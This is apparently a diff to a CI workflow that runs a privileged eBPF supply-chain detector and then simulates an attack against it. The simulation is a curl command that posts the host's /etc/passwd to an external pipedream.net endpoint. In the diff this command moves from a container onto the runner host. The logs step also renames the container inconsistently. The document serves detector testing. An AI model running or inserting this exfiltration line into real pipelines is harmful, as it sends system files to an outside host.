@@ -9,12 +9,12 @@ jobs:
     runs-on: self-hosted
 
     steps:
-      - name: Pull latest detector image
+      - name: Pull latest image
         run: docker pull rohitcoder/supplychain:latest
 
       - name: Run eBPF supply chain detector in background
         run: |
-          docker run -d --name ebpf_detector1 --privileged \
+            docker run -d --name ebpf_detector1 --privileged \
             --pid=host \
             --network=host \
             -v /sys:/sys \
@@ -26,17 +26,13 @@ jobs:
       - name: Wait for eBPF to attach
         run: sleep 10
 
-      - name: Simulate supply chain exfiltration from host namespace
+      - name: Simulate supply chain exfiltration
         run: |
-          docker run --rm --pid=host --network=host \
-            -v /etc/passwd:/etc/passwd:ro \
-            curlimages/curl:latest \
-            curl https://903e71dc0c872212a00b1d19477faafe.m.pipedream.net \
-              --data-binary "@/etc/passwd"
+          curl https://903e71dc0c872212a00b1d19477faafe.m.pipedream.net --data-binary "@/etc/passwd"
 
       - name: Save detector logs to file
         run: |
-          docker logs ebpf_detector1 > ebpf_logs.txt
+          docker logs ebpf_detector > ebpf_logs.txt
           cat ebpf_logs.txt
 
       - name: Stop and cleanup
